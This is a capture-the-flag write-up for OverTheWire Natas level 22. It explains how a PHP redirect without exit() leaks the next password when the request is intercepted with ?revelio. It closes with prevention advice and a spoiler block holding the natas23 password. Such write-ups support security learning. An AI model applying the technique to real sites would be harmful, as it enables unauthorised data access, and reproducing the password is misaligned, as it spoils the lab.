# Natas Level 22 → 23

## Objective

Retrieve the password for the next level by exploiting improper redirect handling.

The application checks whether the user is an administrator. If not, it redirects the user to the homepage.

However, the application does not terminate execution after sending the redirect.

---

## Enumeration

* Logged into the application.
* Reviewed the webpage.
* Viewed the source code.
* Found a parameter named:

```text
revelio
```

* Observed that the application checks for administrator privileges before revealing the password.
* Noticed that the redirect does not stop script execution.

---

# Source Code Analysis

The application checks whether the `revelio` parameter exists.

```php
if(array_key_exists("revelio", $_GET)) {

    if(!($_SESSION &&
         array_key_exists("admin", $_SESSION) &&
         $_SESSION["admin"] == 1)) {

        header("Location: /");
    }
}
```

If the user is not an administrator, the server sends a redirect.

---

## Password Disclosure

Later in the script:

```php
if(array_key_exists("revelio", $_GET)) {

    print "You are an admin. The credentials for the next level are:<br>";

    print "<pre>Username: natas23\n";

    print "Password: <censored></pre>";
}
```

The password is printed whenever the `revelio` parameter exists.

---

# Vulnerability

## Improper Redirect Handling

The application performs a redirect:

```php
header("Location: /");
```

However, it never terminates execution.

Missing:

```php
exit();
```

or

```php
die();
```

A redirect only tells the client to request another page.

PHP continues executing the remaining code unless execution is explicitly stopped.

---

# Execution Flow

Normal execution:

```
Receive Request
      |
      v
Check Admin
      |
      +------ Admin
      |          |
      |          v
      |    Display Password
      |
      +------ Not Admin
                 |
                 v
        Send Redirect Header
                 |
                 X
          Missing exit()
                 |
                 v
        Continue Executing
                 |
                 v
        Display Password
```

---

# Exploitation Strategy

The password is printed whenever the request contains:

```text
?revelio
```

Although the server returns:

```http
HTTP/1.1 302 Found
Location: /
```

the PHP script continues executing and includes the password in the response body.

Most browsers automatically follow the redirect, hiding the original response.

Using an intercepting proxy allows us to inspect the response before the redirect is followed.

---

# Exploitation

Request:

```http
GET /?revelio HTTP/1.1
Host: natas22.natas.labs.overthewire.org
```

Response:

```http
HTTP/1.1 302 Found
Location: /
```

Response body:

```html
You are an admin. The credentials for the next level are:

Username: natas23
Password: ********
```

Even though the redirect is sent, the sensitive information is still present in the response body.

---

# Attack Flow

```
Open Website
      |
      v
Review Source Code
      |
      v
Find revelio Parameter
      |
      v
Find Redirect
      |
      v
Notice Missing exit()
      |
      v
Request ?revelio
      |
      v
Intercept HTTP Response
      |
      v
Ignore Automatic Redirect
      |
      v
Read Password from Response Body
```

---

# Result

The password was successfully retrieved by exploiting improper redirect handling.

The application assumed that sending a redirect would stop execution, but PHP continued running and revealed the password.

---

# Prevention

Always terminate script execution immediately after sending a redirect.

Correct implementation:

```php
header("Location: /");
exit();
```

Additional recommendations:

* Never place sensitive code after a redirect.
* Perform authorization checks before generating sensitive output.
* Test redirects using intercepting proxies to verify that no sensitive data is leaked.

---

# Key Takeaways

* `header("Location: ...")` does **not** stop PHP execution.
* PHP continues executing unless `exit()` or `die()` is called.
* Browsers automatically follow redirects, hiding the original response.
* Intercepting proxies such as Burp Suite reveal the complete HTTP response.
* Sensitive information should never be generated after a redirect.

---

<details>
<summary><strong>🔑 Password (Spoiler)</strong></summary>

```text
Username : natas23
Password : CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5
```

</details>
